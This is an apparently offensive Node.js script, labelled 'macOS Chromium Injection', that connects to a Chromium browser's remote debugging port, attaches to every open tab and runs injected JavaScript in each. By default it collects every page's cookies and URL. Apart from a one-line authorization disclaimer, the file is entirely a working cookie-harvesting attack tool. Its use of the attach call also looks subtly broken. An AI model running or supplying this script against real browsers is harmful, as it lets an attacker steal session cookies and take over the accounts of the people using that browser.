#!/usr/bin/env node
/**
 * macOS Chromium Injection - JavaScript Injection via CDP
 * Usage: node inject-script.js [host] [port] [expression]
 *
 * Only use on systems you own or have explicit authorization to test.
 */

import CDP from 'chrome-remote-interface';

const HOST = process.argv[2] || '127.0.0.1';
const PORT = parseInt(process.argv[3]) || 9222;
const EXPRESSION = process.argv[4] || 'document.cookie + "|" + window.location.href';

console.log(`[+] Connecting to CDP at ${HOST}:${PORT}`);
console.log(`[+] Expression: ${EXPRESSION}`);

(async () => {
  try {
    const client = await CDP({ host: HOST, port: PORT });
    const { Target, Runtime } = client;

    // Get all page targets
    const { targetInfos } = await Target.getTargets();
    const pages = targetInfos.filter(t => t.type === 'page');

    console.log(`[+] Found ${pages.length} page(s)`);
    console.log('');

    for (const target of pages) {
      console.log(`[*] Target: ${target.url}`);
      
      const session = await Target.attachToTarget({ targetId: target.targetId });
      
      try {
        const { result } = await session.send('Runtime.evaluate', {
          expression: EXPRESSION,
          returnByValue: true
        });

        if (result.result.value) {
          console.log(`  Result: ${result.result.value}`);
        } else if (result.result.description) {
          console.log(`  Result: ${result.result.description}`);
        } else {
          console.log(`  Result: (no value)`);
        }
      } catch (evalError) {
        console.log(`  Error: ${evalError.message}`);
      }

      await session.detachFromTarget();
      console.log('');
    }

    await client.close();
  } catch (error) {
    console.error(`[!] Error: ${error.message}`);
    process.exit(1);
  }
})();
